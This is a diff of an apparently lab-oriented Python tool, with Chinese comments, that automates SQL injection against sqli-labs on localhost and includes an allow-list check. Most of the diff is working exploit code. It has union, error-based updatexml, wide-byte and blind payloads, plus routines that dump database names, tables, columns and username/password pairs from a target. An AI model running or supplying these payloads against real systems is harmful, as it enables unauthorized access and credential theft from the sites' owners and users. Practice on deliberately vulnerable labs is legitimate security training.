@@ -49,7 +49,7 @@ def is_target_allowd(url):
     return False
 
 def send_request(url):
-    """统一HTTP请求函数，复用全局session，处理超时、连接异常"""
+    """统一HTTP请求函数,复用全局session,处理超时、连接异常"""
     try:
         resp = session.get(url, timeout=TIMEOUT, allow_redirects=False)
         return resp
@@ -86,7 +86,7 @@ def detect_error_based(base_url, param_name):
             if resp_confirm and resp_confirm.text:
                 has_error_confirm = any(key in resp_confirm.text for key in ERROR_KEYWORDS)
                 if has_error_confirm:
-                    logging.info("二次验证通过，确认字符型SQL注入")
+                    logging.info("二次验证通过,确认字符型SQL注入")
                     return "char"
 
     # 2. 宽字节注入
@@ -100,7 +100,7 @@ def detect_error_based(base_url, param_name):
             if resp_wide_confirm and resp_wide_confirm.text:
                 has_error_wide_confirm = any(key in resp_wide_confirm.text for key in ERROR_KEYWORDS)
                 if has_error_wide_confirm:
-                    logging.info("二次验证通过，确认宽字节SQL注入")
+                    logging.info("二次验证通过,确认宽字节SQL注入")
                     return "wide"
 
     # 3. 数字型注入
@@ -119,7 +119,7 @@ def detect_error_based(base_url, param_name):
 
 # ===== 联合注入工具函数 =====
 def guess_columns(base_url, param_name, inject_format="char", max_columns=20):
-    """自动猜解查询字段列数【修复：探测失败返回0，不返回上限值】"""
+    """自动猜解查询字段列数【修复:探测失败返回0,不返回上限值】"""
     baseline = get_baseline(base_url)
     if not baseline:
         logging.error("无法获取页面基线，猜解失败")
@@ -147,17 +147,18 @@ def guess_columns(base_url, param_name, inject_format="char", max_columns=20):
             logging.info(f"列数猜解完成：{result} 列")
             return result
     
-    # 【关键修复】打到上限说明探测失效（盲注场景不报错），返回0，不返回上限值
+    # 打到上限说明探测失效（盲注场景不报错），返回0
     logging.warning(f"列数探测失败，超过上限 {max_columns}，判定为无报错注入场景")
     return 0
 
 def get_echo_positions(base_url, param_name, columns, inject_format="char"):
-    """自动定位联合查询的回显位【优化：对比基线，排除页面固有数字】"""
+    """自动定位联合查询的回显位【修复：用带标记的唯一字符串，避免页面固有数字误判】"""
     baseline = get_baseline(base_url)
     if not baseline:
         return []
     
-    num_str = ','.join([str(i) for i in range(1, columns + 1)])
+    # 生成带唯一标记的字符串，绝对不会和页面固有内容冲突
+    num_str = ','.join([f"'~{i}~'" for i in range(1, columns + 1)])
     if inject_format == "char":
         payload = f"-1' union select {num_str} %23"
     elif inject_format == "wide":
@@ -172,8 +173,9 @@ def get_echo_positions(base_url, param_name, columns, inject_format="char"):
     
     echo_pos = []
     for i in range(1, columns + 1):
-        # 只有注入后出现、基线页面没有的数字，才是真正的回显位
-        if str(i) in resp.text and str(i) not in baseline["text"]:
+        # 只有注入后出现、基线页面没有的标记，才是真正的回显位
+        marker = f"~{i}~"
+        if marker in resp.text and marker not in baseline["text"]:
             echo_pos.append(i)
     
     filter_echo = [x for x in echo_pos if x != 1]
@@ -183,7 +185,7 @@ def get_echo_positions(base_url, param_name, columns, inject_format="char"):
     if echo_pos:
         logging.info(f"定位到回显位：{echo_pos}")
     else:
-        logging.warning("未找到回显位，不支持联合查询注入")
+        logging.warning("未找到回显位,不支持联合查询注入")
     return echo_pos
 
 def dump_current_db(base_url, param_name, echo_pos, columns, inject_format="char"):
@@ -237,10 +239,10 @@ def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_format=
     logging.info(f"库{db_name}下的表：{tables}")
     return tables
 
-def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_format="char"):
-    """获取表全部列名"""
+def dump_columns(base_url, param_name, echo_pos, db_name, table_name, columns, inject_format="char"):
+    """获取表全部列名【修复：动态生成库名十六进制，移除硬编码】"""
     table_hex = "0x" + table_name.encode('utf-8').hex()
-    db_hex = "0x7365637572697479"
+    db_hex = "0x" + db_name.encode('utf-8').hex()
     field_concat = "concat(0x3c3c3c, group_concat(column_name), 0x3e3e3e)"
     select_list = [str(i) for i in range(1, columns + 1)]
     select_list[echo_pos[0] - 1] = field_concat
@@ -266,7 +268,7 @@ def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_for
     return cols
 
 def dump_table_data(base_url, param_name, echo_pos, table_name, columns, inject_format="char"):
-    """脱表数据，提取username和password"""
+    """脱表数据,提取username和password"""
     field_concat = "concat(0x3c3c3c, group_concat(username,0x7c,password), 0x3e3e3e)"
     select_list = [str(i) for i in range(1, columns + 1)]
     select_list[echo_pos[0] - 1] = field_concat
@@ -324,7 +326,7 @@ def union_auto_dump(base_url, param_name, inject_format):
         return None
     
     target_table = "users" if "users" in tables else tables[0]
-    columns = dump_columns(base_url, param_name, echo_pos, target_table, cols, inject_format=inject_format)
+    columns = dump_columns(base_url, param_name, echo_pos, db_name, target_table, cols, inject_format=inject_format)
     data = dump_table_data(base_url, param_name, echo_pos, target_table, cols, inject_format=inject_format)
     
     return {
@@ -334,6 +336,146 @@ def union_auto_dump(base_url, param_name, inject_format):
         "columns": columns,
         "data": data
     }
+
+
+
+#===================新增：报错注入脱库===================
+def check_error_based_dump(base_url, param_name, inject_format="char"): 
+    """检测是否支持报错注入脱库"""
+    if inject_format == "char":
+        payload = f"1' AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
+    elif inject_format == "wide":
+        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
+    else:
+        payload = f"1 AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return False
+    return "~~~" in resp.text and "XPATH" in resp.text
+
+def error_extract_data(html_text):
+    """从updatexml报错中提取数据【核心修复：利用原生报错单引号边界】"""
+    match = re.search(r"XPATH syntax error: '~~~(.*?)'", html_text, re.DOTALL)
+    return match.group(1).strip() if match else ""
+
+def error_dump_db(base_url, param_name, inject_format="char"):
+    """报错注入获取当前数据库名"""
+    if inject_format == "char":
+        payload = f"1' AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
+    elif inject_format == "wide":
+        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
+    else:
+        payload = f"1 AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return ""
+    
+    db_name = error_extract_data(resp.text)
+    logging.info(f"当前数据库名：{db_name}")
+    return db_name
+
+def error_dump_tables(base_url, param_name, db_name, inject_format="char"):
+    """报错注入获取指定库的所有表名"""
+    sub_sql = f"(select group_concat(table_name) from information_schema.tables where table_schema=database())"
+    
+    if inject_format == "char":
+        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    elif inject_format == "wide":
+        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    else:
+        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return []
+    
+    tables_str = error_extract_data(resp.text)
+    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
+    logging.info(f"库{db_name}下的表：{tables}")
+    return tables
+
+def error_dump_columns(base_url, param_name, db_name, table_name, inject_format="char"):
+    """报错注入获取指定表的所有列名"""
+    table_hex = "0x" + table_name.encode('utf-8').hex()
+    sub_sql = f"(select group_concat(column_name) from information_schema.columns where table_name={table_hex} and table_schema=database())"
+    
+    if inject_format == "char":
+        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    elif inject_format == "wide":
+        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    else:
+        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return []
+    
+    cols_str = error_extract_data(resp.text)
+    cols = [c.strip() for c in cols_str.split(",") if c.strip()]
+    logging.info(f"表 {table_name} 的列：{cols}")
+    return cols
+
+def error_dump_data(base_url, param_name, table_name, inject_format="char"):
+    """报错注入脱取 users 表数据"""
+    sub_sql = f"(select group_concat(username, 0x7c, password) from {table_name})"
+    
+    if inject_format == "char":
+        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    elif inject_format == "wide":
+        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    else:
+        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
+    
+    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
+    resp = send_request(test_url)
+    if not resp or not resp.text:
+        return []
+    
+    data_str = error_extract_data(resp.text)
+    if not data_str:
+        return []
+    
+    raw_rows = data_str.split(",")
+    result = []
+    for item in raw_rows:
+        if "|" in item:
+            u, p = item.split("|", 1)
+            result.append({"username": u.strip(), "password": p.strip()})
+    
+    logging.info(f"脱取数据：{result}")
+    return result
+
+def error_auto_dump(base_url, param_name, inject_format):
+    """报错注入全自动脱库"""
+    logging.info("===== 开始报错注入脱库 =====")
+    db_name = error_dump_db(base_url, param_name, inject_format=inject_format)
+    if not db_name:
+        logging.error("获取库名失败")
+        return None
+    
+    tables = error_dump_tables(base_url, param_name, db_name, inject_format=inject_format)
+    if not tables:
+        logging.error("获取表名失败")
+        return None
+    
+    target_table = "users" if "users" in tables else tables[0]
+    columns = error_dump_columns(base_url, param_name, db_name, target_table, inject_format=inject_format)
+    data = error_dump_data(base_url, param_name, target_table, inject_format=inject_format)
+    
+    return {
+        "db_name": db_name,
+        "tables": tables,
+        "target_table": target_table,
+        "columns": columns,
+        "data": data
+    }
+
 
 # ===================== 盲注通用核心函数 =====================
 def blind_get_length(check_func, url, param_name, sql_expr):
@@ -408,14 +550,21 @@ def is_time_true(url, param_name, payload_suffix, delay=3):
     return resp.elapsed.total_seconds() >= delay * 0.8
 
 def check_time_blind(base_url, param_name):
-    """检测时间盲注是否可用（兜底检测）"""
+    """检测时间盲注是否可用【修复：真假双条件校验 + 二次验证】"""
     resp_normal = send_request(base_url)
     if not resp_normal:
         return False
     normal_time = resp_normal.elapsed.total_seconds()
     
-    if is_time_true(base_url, param_name, "1=1"):
-        if is_time_true(base_url, param_name, "1=1"):
+    # 真条件延时 + 假条件不延时，双条件校验
+    test_true = is_time_true(base_url, param_name, "1=1")
+    test_false = not is_time_true(base_url, param_name, "1=2")
+    
+    if test_true and test_false:
+        # 二次验证，避免网络波动误判
+        test_true2 = is_time_true(base_url, param_name, "1=1")
+        test_false2 = not is_time_true(base_url, param_name, "1=2")
+        if test_true2 and test_false2:
             logging.info("二次验证通过，确认时间盲注可用")
             return True
     return False
@@ -489,7 +638,7 @@ def blind_auto_dump(check_func, url, param_name):
 def check_sql_injection(base_url, param_name):
     """
     综合检测注入点，按优先级返回最优注入类型
-    优先级：联合注入 > 布尔盲注 > 时间盲注
+    优先级：联合注入 > 报错注入 > 布尔盲注 > 时间盲注
     """
     if not is_target_allowd(base_url):
         logging.error("目标不在白名单授权中，拒绝执行")
@@ -500,11 +649,12 @@ def check_sql_injection(base_url, param_name):
         logging.error("目标页面无法访问，检测终止")
         return {"has_inject": False, "inject_type": "", "inject_format": ""}
 
+    # ========== 第一层：先确认注入点是否存在 ==========
     inject_format = ""
-    # 第一步：先检测报错型注入
+    # 1. 先试报错型注入检测
     inject_format = detect_error_based(base_url, param_name)
 
-    # 第二步：报错型没检测到，补充检测盲注型注入是否存在
+    # 2. 报错型没检测到，用盲注状态确认注入是否存在
     if not inject_format:
         if check_boolean_blind(base_url, param_name):
             inject_format = "char"
@@ -513,9 +663,10 @@ def check_sql_injection(base_url, param_name):
             inject_format = "char"
             logging.info("通过时间延时确认存在字符型注入")
         else:
+            # 所有检测都不通过，才判定无注入
             return {"has_inject": False, "inject_type": "", "inject_format": ""}
 
-    # 第三步：按优先级判断最优注入类型
+    # ========== 第二层：按优先级选最优脱库方式 ==========
     # 1. 优先联合注入（效率最高）
     cols = guess_columns(base_url, param_name, inject_format=inject_format)
     if cols > 0:
@@ -523,20 +674,25 @@ def check_sql_injection(base_url, param_name):
         if echo_pos:
             return {"has_inject": True, "inject_type": "union", "inject_format": inject_format}
     
-    # 2. 其次布尔盲注
+    # 2. 其次报错注入脱库
+    if check_error_based_dump(base_url, param_name, inject_format=inject_format):
+        return {"has_inject": True, "inject_type": "error", "inject_format": inject_format}
+    
+    # 3. 然后布尔盲注
     if check_boolean_blind(base_url, param_name):
         return {"has_inject": True, "inject_type": "boolean_blind", "inject_format": inject_format}
     
-    # 3. 最后时间盲注兜底
+    # 4. 最后时间盲注兜底（只要有注入点，这个一定能用）
     if check_time_blind(base_url, param_name):
         return {"has_inject": True, "inject_type": "time_blind", "inject_format": inject_format}
     
-    return {"has_inject": False, "inject_type": "", "inject_format": ""}
+    # 极端情况：注入点存在但所有脱库方式都失效
+    return {"has_inject": True, "inject_type": "unknown", "inject_format": inject_format}
 
 # ===================== 主入口 =====================
 if __name__ == "__main__":
-    # 切换测试目标：Less-1/Less-2联合注入 / Less-8布尔盲注 / Less-9时间盲注
-    target_url = "http://localhost/sqli-labs/Less-9/?id=1"
+    # 切换测试目标：Less-1/Less-2联合注入 / Less-5报错注入 / Less-8布尔盲注 / Less-9时间盲注
+    target_url = "http://localhost/sqli-labs/Less-8/?id=1"
     param = "id"
     
     print("[INFO] 开始检测注入点...")
@@ -554,6 +710,13 @@ if __name__ == "__main__":
         dump_result = union_auto_dump(target_url, param, inject_format)
         if dump_result:
             print("\n[+] 联合注入脱库完成！")
+            print(f"数据库名：{dump_result['db_name']}")
+            print(f"用户数据：{dump_result['data']}")
+    
+    elif inject_type == "error":
+        dump_result = error_auto_dump(target_url, param, inject_format)
+        if dump_result:
+            print("\n[+] 报错注入脱库完成！")
             print(f"数据库名：{dump_result['db_name']}")
             print(f"用户数据：{dump_result['data']}")
     
